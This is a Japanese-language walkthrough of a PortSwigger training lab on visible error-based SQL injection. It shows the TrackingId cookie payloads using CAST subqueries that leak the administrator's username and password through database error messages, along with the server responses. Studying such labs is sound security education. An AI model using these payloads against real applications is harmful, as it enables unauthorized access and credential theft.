# 目に見えるエラーベースの SQL インジェクション

次のハッキングラボを実施します  
https://portswigger.net/web-security/sql-injection/blind/lab-sql-injection-visible-error-based  
このラボには SQL インジェクションの脆弱性が含まれています。アプリケーションは分析に追跡 Cookie を使用し、送信された Cookie の値を含む SQL クエリを実行します。SQL クエリの結果は返されません。

- 1. BurpSuite を起動して、Proxy タブからブラウザを立ち上げます
- 2. ハッキングラボにアクセスします
- 3. Trackingid を Cookie に含む GET / リクエストを send to repeater します
- 4. Trackingid の後に'を付加して送信すると、SQL エラーが発生します

```
Cookie: TrackingId=w5Y1j22fFFWhOp3j';
```

レスポンス

```html
<h4>Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = 'w5Y1j22fFFWhOp3j''. Expected char</h4>
<p class="is-warning">Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = 'w5Y1j22fFFWhOp3j''. Expected char</p>
```

- 5. 以下のようにしてリクエストを送信します。エラーになりません。

```
Cookie: TrackingId=w5Y1j22fFFWhOp3j'--;
```

- 6. ' AND CAST((SELECT 1) AS int)--を付加してリクエストを送信すると、bool 型にしてくれと怒られます。

```html
<h4>ERROR: argument of AND must be type boolean, not type integer Position: 63</h4>
<p class="is-warning">ERROR: argument of AND must be type boolean, not type integer Position: 63</p>
```

- 7. ' AND 1=CAST((SELECT username FROM users) AS int)--を付加してリクエストを送信します

```
Cookie: TrackingId=w5Y1j22fFFWhOp3j' AND 1=CAST((SELECT username FROM users) AS int)--;
```

レスポンス

```
Unterminated string literal started at position 95 in SQL
```

文字列が切り捨てられてエラーになっています

- 8. trakingid の値を削り、再度送信します

```
Cookie: TrackingId=' AND 1=CAST((SELECT username FROM users) AS int)--;
```

レスポンス

```html
<h4>ERROR: more than one row returned by a subquery used as an expression</h4>
```

複数行返す SQL だと怒られます

- 9. 1 行返す SQL に書き換えて送信します

```
Cookie: TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--;
```

レスポンス

```html
<h4>ERROR: invalid input syntax for type integer: "administrator"</h4>
```

administrator が最初の 1 行目だと分かります

- 10. パスワードを取得する SQL に書き換えて送信します

```
Cookie: TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--;
```

レスポンス

```html
<h4>ERROR: invalid input syntax for type integer: "k4ozlascs5n3uqirbxxp"</h4>
```

- 10. administrator でログインします
